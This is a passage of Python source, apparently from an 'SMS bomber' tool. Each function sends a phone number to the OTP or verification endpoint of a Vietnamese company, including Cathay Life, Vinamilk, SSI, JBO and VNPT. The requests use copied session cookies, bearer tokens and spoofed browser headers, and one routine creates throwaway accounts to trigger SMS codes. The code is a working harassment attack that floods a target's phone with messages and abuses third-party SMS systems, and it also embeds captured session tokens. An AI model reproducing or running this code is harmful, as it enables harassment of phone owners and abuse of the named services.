		"Cookie": "__ork_u=; __ork_u_idt=; __ork_u_ph=; _ga=GA1.1.432180111.1716292753; _fbp=fb.1.1716292754278.2119388214; _clck=45rd69%7C2%7Cfly%7C0%7C1602; _clsk=x575d4%7C1716292764260%7C3%7C1%7Ck.clarity.ms%2Fcollect; AWSALB=uGRHAJKICl59E34R+oIns+luA8Tu/4rOq8ZAoTvzD9eeYpDFAUBb45dMY7BinsDUWWYV6iWoy5tikF2mYA/SSoAmVUmV1viItR5jWANvbOuxZbPeogF1W9Lafiy/mPTN5/vHPfgyL3k+qu+2d8txkxNflEU5b6RHYW5zJILU/r8CXrYWJjK6qHp64M2s6g==; _ga_5P2ERWSMJD=GS1.1.1716292753.1.1.1716292777.36.0.0"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def cathelife_live(phone):
	url = "https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/sendOTP"

	payload = f"phone={phone}&email=vrxxdev%40gmail.com&LINK_FROM=signUp2&CUSTOMER_NAME=Nguy%E1%BB%85n+Duy&POL_HOLDER_NUM=&LANGS=vi_VN"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://www.cathaylife.com.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10100.html",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"Cookie": "JSESSIONID=wxpJHrb6OanZkJfrn7u8ewDa.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd7813bf0b7a9c1d0a49cb5b5d28c49abb709bd2ddae01873c6b21e633e54d42b24afba48ec7d48f94cb8347d4875961419; BIGipServerB2C_http=!hd2NCjmgpEUXU9QR4wuMnLjIghcvhna4vj7lDyCgmxzFcBRzExD2TrKkPyV3Efi13qQL285RUyVJ; TS0173f952=0110512fd7813bf0b7a9c1d0a49cb5b5d28c49abb709bd2ddae01873c6b21e633e54d42b24afba48ec7d48f94cb8347d4875961419; _ga=GA1.3.1765730409.1716293033; _gid=GA1.3.1202356950.1716293033; _ga_M0ZP5CJBQZ=GS1.1.1716293032.1.0.1716293036.0.0.0; INITSESSIONID=0290dc487d90d06102182d31d0e2a40a"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def glx_live(phone):
	url = "https://api.glxplay.io/account/phone/verify"

	params = {
		"phone": phone
	}
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"x-requested-with": "XMLHttpRequest",
		"accept-language": "vi",
		"sec-ch-ua-mobile": "?1",
		"access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiIyMjcyYWVmOS00OTMxLTRmMWQtYmViMC01ZDYzNTVmOWYwMjgiLCJkaWQiOiIyYjZiZDMxNS05ZTNhLTQ5NjgtOWZmNi0wMjQxNzRhNmMwMjYiLCJpcCI6IjExNi4xMDUuMjIxLjI0NyIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfGFuZHJvaWR8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTcxNjI5NTM2MywiZXhwIjoxNzMxODQ3MzYzfQ.ZApC1kVCTvMNZhP1VNtINr15srzYAYnPVOgAvib3XmM",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://galaxyplay.vn",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://galaxyplay.vn/",
		"priority": "u=1, i"
	}
		
	response = requests.post(url, params=params, headers=headers)
def ensure_live(phone):
	url = "https://ensure.vn/process-page1/getotp"

	files = [
		("type", (None, "LTS")),
		("campagin_name", (None, "ENS_2024_LTS_Mar")),
		("name", (None, "Nguyễn Duy")),
		("dob", (None, f"{random.randint(1, 29):02d}-{random.randint(1, 12):02d}-1998")),
		("address", (None, f"{random.randint(10, 999)} Phường Châu Xuân")),
		("email", (None, "vrxx" + generate_random_email(5))),
		("city", (None, "Bà Rịa Vũng Tàu")),
		("city_code", (None, "BRVT")),
		("district", (None, "H. Châu Đức")),
		("district_code", (None, "BRVT.CD")),
		("phone", (None, phone)),
		("utmstring", (None, "")),
		("utmsource", (None, "")),
		("utmcampaign", (None, "")),
		("utmcontent", (None, "")),
		("utmmedium", (None, "")),
		("utmterms", (None, "")),
		("_token", (None, "bp4PjS1lA8VwWHWsxASQl5SoKR350m13xsdyfvzO"))
	]
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/multipart-formdata",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"x-requested-with": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://ensure.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://ensure.vn/vulan",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "_atrk_siteuid=Sr0wty9-49CZYxhz; _atrk_ssid=8SEYPcKdfPEh7MDq_utC18; appier_pv_counterPageView_338b=0; appier_page_isView_PageView_338b=b46b6d61143976ed3ecf0196e8e758a3509f5ec9e6a220c62626a87277e6c3a5; appier_pv_counterViewTwoPages_2663=0; appier_page_isView_ViewTwoPages_2663=b46b6d61143976ed3ecf0196e8e758a3509f5ec9e6a220c62626a87277e6c3a5; appier_random_unique_id_ViewLanding_ensure-gold-live-the-life-you-love=G5WecjU4fOEZzxzPHKMK0g; appier_utmz=%7B%22csr%22%3A%22www.family.abbott%22%2C%22timestamp%22%3A1716296735%2C%22lcsr%22%3A%22www.family.abbott%22%7D; appier_random_unique_id_Conversion_click_xac_nhan=jITNh-1XeJZe3JSdG9ofPN; _atrk_sessidx=6"
	}
		
	response = requests.post(url, files=files, headers=headers)
def vsporrts_live(phone):
	url = "https://vsports.vn/api/v1/users/verify/send"

	params = {
		"lang": "vi"
	}
		
	payload = json.dumps({
		"email": phone
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwibmFtZSI6IkFub255bW91cyIsImF2YXRhciI6IiIsInR5cGUiOiJhbm9ueW1vdXMiLCJsYW5ndWFnZV9pZCI6ImVuIiwiaWF0IjoxNjUzMzQwOTE5fQ.9BMudg88cBjqhLzB1BAvg7SKgm1cSEbV04leVW-ety8",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://vsports.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://vsports.vn/?_branch_match_id=1287240875195024971&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXLysuyC8qKdZLLCjQy8nMy9a3VzUySUvMyUlKTM6OLy3Ksc0AqVQ1dlQ1cgMimPqyPCAHAJ7wW7lFAAAA",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "_ga=GA1.1.485672937.1716297503; __stripe_mid=dee7149c-b5a0-48c9-9b20-7589bc75d7b2d8972b; _ga_9T0EPZ2JC8=GS1.1.1716299337.2.1.1716299339.58.0.0; __stripe_sid=730e13df-c21e-4cba-b8d0-44aa7a19f0cdc1f4a5"
	}
		
	response = requests.post(url, params=params, data=payload, headers=headers)
def vinamilk_live(phone):
	url = "https://new.vinamilk.com.vn/api/account/getotp"

	payload = "{\"type\":\"register\",\"phone\":\"" + phone + "\"}"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "text/plain",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"authorization": "Bearer null",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://new.vinamilk.com.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://new.vinamilk.com.vn/account/register",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%2236ff7cf67c68e3e941bb4220637ec560%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1716300487%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dc5999d2ce9c73d86245132be1654d75a; _gcl_au=1.1.704192204.1716300492; _gid=GA1.3.1179646701.1716300493; _tt_enable_cookie=1; _ttp=ZwU_aKIEXGvBiGDMWtAjys5uzJ5; _fbp=fb.2.1716300495098.754226237; _ga_QK73YYY91J=GS1.3.1716300494.1.0.1716300507.47.0.0; _ga_NVEKX684ZM=GS1.1.1716300492.1.0.1716300587.60.0.0; __cf_bm=hAffb18R3Npghr6C.89eaR8H2nMgsG.HdoLWmYI67WY-1716300591-1.0.1.1-kNsfIA5JiZKc17Sl9dx.NvQLaWhyJYX2Emh4yOfkO2_9Ay3L9tl9ajxl7EooHOHC55uBruUMK85TMRGWTdvHcg; builderSessionId=276354f2af654e60a77c078c68d00f3c; _gcl_aw=GCL.1716300598.Cj0KCQjwjLGyBhCYARIsAPqTz1_L_Qd4EVj4qFSI4uHY3pLH-ZWYLYPXVOIpA5kibzrqftvBVSjDnJIaAlP0EALw_wcB; _ga=GA1.1.1807857817.1716300493; sca_fg_codes=[]; _hjSessionUser_2067180=eyJpZCI6ImU3MjA3YzZlLWJmZTUtNWY4NC05ZmJlLTQyMGFhNTA5MWU2MSIsImNyZWF0ZWQiOjE3MTYzMDA2MDEyNDAsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_2067180=eyJpZCI6ImUzZTcyYTIwLTAzNzktNGIzZi04MDk4LTE3MmJkZWMzNjBkYyIsImMiOjE3MTYzMDA2MDEyNDYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _clck=1ezv8mb%7C2%7Cfly%7C0%7C1602; avadaIsLogin=; _ga_6NH1HJ4MRS=GS1.1.1716300492.1.1.1716300618.29.0.0; _clsk=tq7q3y%7C1716300620154%7C3%7C1%7Ck.clarity.ms%2Fcollect"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def ssis_live(phone):
	url = "https://accounts-api.ssi.com.vn/customer/account/validate-non-trading-user-info"
		
	payload = json.dumps({
		"mobile": phone,
		"email": "vrxxclone20241@gmail.com",
		"fullName": "Nguyễn Duy ",
		"password": "K36U7JG#Ffy#9#!",
		"channel": "AP"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, utf-8",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"device-id": "2A525059-CC7E-4AD8-9907-70C0923E38C1",
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": "\"Linux\"",
		"origin": "https://accounts.ssi.com.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def jbox_live(phone):
	username = "Vrxx" + generate_random_username(5)
	
	url = "https://gatewayvn.jbovn6.com/api/Member"
	url2 = "https://gatewayvn.jbovn6.com/api/Login"
	url3 = "https://gatewayvn.jbovn6.com/api/Verification/Phone/Verify"
	
	params = {
		"api-version": "3.0",
		"brand": "jbo",
		"Platform": "Mobile"
	}
	
	payload = json.dumps({
		"referer": None,
		"hostName": "https://gatewayvn.jbovn6.com",
		"regWebsite": 2,
		"language": "vi-vn",
		"mobile": "84-" + phone[1:],
		"brandCode": "JBO",
		"currency": "VND",
		"userName": username,
		"mediaCode": None,
		"affiliateCode": "J103630",
		"email": "",
		"password": "Vrxxdev1337",
		"blackBoxValue": "",
		"e2BlackBoxValue": "0002MDAwN0xTVE9LRU4wMDI0YWIyZmQzNDEtNmRmMC00YTY1LThjN2UtZTVkNjIzM2ExZTI0MDAwNklOVExPQzAwMmNodHRwczovL3d3dy5qYm92bjYuY29tL3ZuL21vYmlsZS9yZWdpc3RlcmVkLzAwMDVKRU5CTDAwMDExMDAwNUpTU1JDMDAyMGh0dHBzOi8vZTIucGxhdGZvcm04ODc5OC5jb20vRTIvMDAwNFVBR1QwMDZmTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2MDAwN0pTVE9LRU4wMDI0YWIyZmQzNDEtNmRmMC00YTY1LThjN2UtZTVkNjIzM2ExZTI0MDAwN0hBQ0NMTkcwMDRkdmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUsemgtQ047cT0wLjQsemg7cT0wLjMwMDA3SEFDQ0NIUjAwMGZVbmljb2RlIChVVEYtOCkwMDA1SlNWRVIwMDAzMi4wMDAwNFRaT04wMDA0LTQyMDAwMDZKU1RJTUUwMDE3MjAyNC8wNS8yMSAxNTo0MzowMC4wODUwMDA3U1ZSVElNRTAwMTQ1LzIxLzIwMjQgMzo0MzowMCBQTTAwMDVKQlJOTTAwMGRDaHJvbWUgTW9iaWxlMDAwNUpCUlZSMDAwOTEyNC4wLjAuMDAwMDVKQlJPUzAwMGFBbmRyb2lkIDEwMDAwNUpCUkNNMDAxNEs7IEtIVE1MLCBsaWtlIEdlY2tvMDAwNUpMQU5HMDAwNXZpLVZOMDAwNEpSRVMwMDA3ODQ1eDQwMDAwMDZKUkVGUlIwMDE3aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8wMDA0SUdHWTAwMmNzSVpTUjViWHdVaUFmYjY2UFpRQXVIakMwSTJjUFYwSXJBY0xHcHF3cGh3PTAwMDVBUFZFUjAwNjc1LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2MDAwNUFQTkFNMDAwOE5ldHNjYXBlMDAwNU5QTEFUMDAwY0xpbnV4IGFybXY4MTAwMDJNVjAwMjAwQjQ4RkQwNEMyNDE2NTFCOEQ5NEI5MjEzNzdERTcwNjAwMDhXREJUT0tFTjAwMjRhYjJmZDM0MS02ZGYwLTRhNjUtOGM3ZS1lNWQ2MjMzYTFlMjQwMDA0SExCVzAwMDEwMDAwNkNUT0tFTjAwMjRhYjJmZDM0MS02ZGYwLTRhNjUtOGM3ZS1lNWQ2MjMzYTFlMjQwMDA4V0VCUlRDSVAwMDBmMTE2LjEwNS4yMjEuMjQ3MDAwN1BSSVZBVEUwMDA1ZmFsc2U=",
		"queleaReferrerId": ""
	})
	
	payload2 = json.dumps({
		"hostName": "https://gatewayvn.jbovn6.com",
		"grantType": "password",
		"clientId": "JBO.VN.gb2bc",
		"clientSecret": "JBOmuittenVN",
		"username": username,
		"password": "Vrxxdev1337",
		"scope": "Mobile.Service offline_access",
		"appId": "net.gb2bc.jbo.vnd",
		"siteId": 2,
		"captchaId": "",
		"e2": "0002MDAwN0xTVE9LRU4wMDI0YWIyZmQzNDEtNmRmMC00YTY1LThjN2UtZTVkNjIzM2ExZTI0MDAwNklOVExPQzAwMmNodHRwczovL3d3dy5qYm92bjYuY29tL3ZuL21vYmlsZS9yZWdpc3RlcmVkLzAwMDVKRU5CTDAwMDExMDAwNUpTU1JDMDAyMGh0dHBzOi8vZTIucGxhdGZvcm04ODc5OC5jb20vRTIvMDAwNFVBR1QwMDZmTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2MDAwN0pTVE9LRU4wMDI0YWIyZmQzNDEtNmRmMC00YTY1LThjN2UtZTVkNjIzM2ExZTI0MDAwN0hBQ0NMTkcwMDRkdmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUsemgtQ047cT0wLjQsemg7cT0wLjMwMDA3SEFDQ0NIUjAwMGZVbmljb2RlIChVVEYtOCkwMDA1SlNWRVIwMDAzMi4wMDAwNFRaT04wMDA0LTQyMDAwMDZKU1RJTUUwMDE3MjAyNC8wNS8yMSAxNTo0MzowMC4wODUwMDA3U1ZSVElNRTAwMTQ1LzIxLzIwMjQgMzo0MzowMCBQTTAwMDVKQlJOTTAwMGRDaHJvbWUgTW9iaWxlMDAwNUpCUlZSMDAwOTEyNC4wLjAuMDAwMDVKQlJPUzAwMGFBbmRyb2lkIDEwMDAwNUpCUkNNMDAxNEs7IEtIVE1MLCBsaWtlIEdlY2tvMDAwNUpMQU5HMDAwNXZpLVZOMDAwNEpSRVMwMDA3ODQ1eDQwMDAwMDZKUkVGUlIwMDE3aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8wMDA0SUdHWTAwMmNzSVpTUjViWHdVaUFmYjY2UFpRQXVIakMwSTJjUFYwSXJBY0xHcHF3cGh3PTAwMDVBUFZFUjAwNjc1LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI0LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2MDAwNUFQTkFNMDAwOE5ldHNjYXBlMDAwNU5QTEFUMDAwY0xpbnV4IGFybXY4MTAwMDJNVjAwMjAwQjQ4RkQwNEMyNDE2NTFCOEQ5NEI5MjEzNzdERTcwNjAwMDhXREJUT0tFTjAwMjRhYjJmZDM0MS02ZGYwLTRhNjUtOGM3ZS1lNWQ2MjMzYTFlMjQwMDA0SExCVzAwMDEwMDAwNkNUT0tFTjAwMjRhYjJmZDM0MS02ZGYwLTRhNjUtOGM3ZS1lNWQ2MjMzYTFlMjQwMDA4V0VCUlRDSVAwMDBmMTE2LjEwNS4yMjEuMjQ3MDAwN1BSSVZBVEUwMDA1ZmFsc2U="
	})
	
	payload3 = {
		"MsIsdn": "84-" + phone[1:],
		"IsRegistration": False,
		"IsOneTimeService": False,
		"memberCode": "",
		"currencyCode": "VND",
		"SiteId": 2,
		"IsMandatoryStep": False,
		"ServiceAction": "ContactVerification",
		"smsType": 1
	}
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, utf-8",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-platform": "\"Android\"",
		"culture": "vi-vn",
		"sec-ch-ua-mobile": "?1",
		"origin": "https://www.jbovn6.com",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.jbovn6.com/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, utf-8",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-platform": "\"Android\"",
		"culture": "vi-vn",
		"sec-ch-ua-mobile": "?1",
		"origin": "https://www.jbovn6.com",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.jbovn6.com/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
	
	headers3 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, utf-8",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-platform": "\"Android\"",
		"culture": "vi-vn",
		"sec-ch-ua-mobile": "?1",
		"authorization": "",
		"origin": "https://www.jbovn6.com",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.jbovn6.com/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
		
	response = requests.post(url, params=params, data=payload, headers=headers)
	if response.json().get("isSuccess"):
		response = requests.post(url2, params=params, data=payload2, headers=headers2)
		
		if response.json().get("accessToken"):
			token = response.json()["accessToken"]["access_token"]
			memcode = response.json()["memberInfo"]["memberCode"]
			params["isFirstRequest"] = "false"
			params["is4Digit"] = "false"
			payload3["memberCode"] = memcode
			payload3 = json.dumps(payload3)
			headers3["authorization"] = f"bearer {token}"
			response = requests.post(url3, params=params, data=payload3, headers=headers3)
def enphase_live(phone):
	url = "https://box.otpbox.vn/service/process/" + phone

	params = {
		"method": "default"
	}
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"Data-Type": "application/appView_json",
		"Csrf-Otpbox": "bcff2425d97c468978e918ca9b220f83a70181bb30fc1ff4c6f13dfb51f49ec8",
		"sec-ch-ua-mobile": "?1",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-platform": "\"Android\"",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://box.otpbox.vn/load/box.html?code=bcff2425d97c468978e918ca9b220f83a70181bb30fc1ff4c6f13dfb51f49ec8",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3"
	}
		
	response = requests.get(url, params=params, headers=headers)
def vnpt_live(phone):
	url = "https://digishop.vnpt.vn/apiprod/order/sentOtpForVinaphoneSub"

	payload = json.dumps({
		"msisdn": phone,
		"packageCode": "SPOTV10",
		"packName": "SPOTV10",
		"duration": 1,
		"durationUnit": 2,
		"type": 1
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-mobile": "?1",
		"Authorization": "Bearer",
		"clientId": "89762d26d5d2d72c2e31acbdf8c5edf99db62ee5c1ef51931bba1e7e97858cdb",
		"secureKey": "eyJhbGciOiJSUzI1NiJ9.eyJyZXF1ZXN0VGltZSI6IjIwMjQwNTIyMTIwNTE3IiwiY2xpZW50SWQiOiI4OTc2MmQyNmQ1ZDJkNzJjMmUzMWFjYmRmOGM1ZWRmOTlkYjYyZWU1YzFlZjUxOTMxYmJhMWU3ZTk3ODU4Y2RiIiwib3MiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjQuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJqdGkiOiIwMmU2OTRhNi01ODJjLTQ3MDgtYWRmZi1mN2ZjOGQ5NmMxMGQiLCJpYXQiOjE3MTYzNTA3MTcsImV4cCI6MTcxNjM1NDkxN30.NGkbvxzgMf2rzkoLZZYGybIAo7zUOoxJ4v87vVc6Gfq1Ra6homqik7h77OW_HkJo5zi5atf91F6-7qc0uUPncjuvK3_NiaAoGO6FBfbFf0H-UOIW5WJRDh8VnUG95v05nmHb63vTAqdQMsAxMV0LiE4qfpzf_5XG4hfanFazVyRx27hXPz-SU1FpX6Q5wjVzG3lAtmLse8N6MovTD_Q70mDuBkteOvWJQKhrW7qb2kVuisUzbdj0937pCfCLd6sZqsft9GAVgkxyp_jtrK2xk3-PCxH3frtxCMiCEJvbynI7g0gi0SG3jcQln2RRK-pCcRskvScv8wodS9E00u9PqjlaqHMD01OkeIV8rWE-y3MypLzZCK0rBLca9Jlaa0hU4yl0UUUZL96Y-53GMg98TP90Gftl0zhvfslOWilSpb9c2XdMvVA-CNx07VQNchbR4GsOLjZkjD1_beU2Pcud9A-CmS5sUZhLeZoY4BuHRdPJvCH0Y3vH4_K13w4LrhuG22WJBYFLePMJWs_gTCoe35cdqLdGOVF50nOWUDJz3ZOzvUUyIriWN0k4iPZbg00LUuXVTfst1V1u_4mXPeV3IXi1OCFZju7KG5eio6p4AyC4o_5KCEVkqybE8LOdENQqfFnV6YusLynWe3BR-2zHHx5tk8CIMCmTZk9l1Z4JQBU",
		"os": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://digishop.vnpt.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
